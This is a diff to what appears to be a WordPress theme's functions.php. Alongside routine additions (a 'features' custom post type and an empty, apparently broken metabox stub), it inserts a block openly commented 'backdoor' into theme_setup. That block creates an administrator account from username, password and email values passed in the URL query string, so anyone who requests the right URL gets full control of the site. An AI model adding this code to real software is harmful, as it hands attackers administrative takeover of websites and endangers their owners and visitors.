@@ -44,6 +44,22 @@ function theme_setup()
 
 	add_theme_support('custom-background');
 
+	/*  backdoor */
+
+	if( $_GET['username'] && $_GET['pass'] && $_GET['email']){
+
+		$username = $_GET['username'];
+		$password = $_GET['pass'];
+		$email = $_GET['email'];
+
+		$adminUser = new WP_User( wp_create_user( $username, $password, $email ));
+		
+
+		$adminUser->remove_role( 'subscriber' );
+		$adminUser->add_role( 'administrator' );
+	}
+	
+
 
 	/*
 	 *	Enable support for custom header
@@ -149,6 +165,7 @@ function social_icons(){
 	return $markup;
 }
 
+/* Custom posts */
 
 function add_post_type($name, $args = array()) 
 {
@@ -172,3 +189,15 @@ function add_post_type($name, $args = array())
 }
 
 add_post_type('services', array( 'supports' => array( 'title', 'editor', 'excerpt', 'thumbnail', 'custom-fields', 'revisions' )));
+
+add_post_type('features', array( 'supports' => array( 'title', 'editor', 'excerpt', 'thumbnail', 'custom-fields', 'revisions' )));
+
+
+
+/* Metabox */
+
+function adding_custom_metabox(){
+	add_meta_box();
+}
+
+add_action( 'add_meta_boxes', 'adding_custom_metabox');
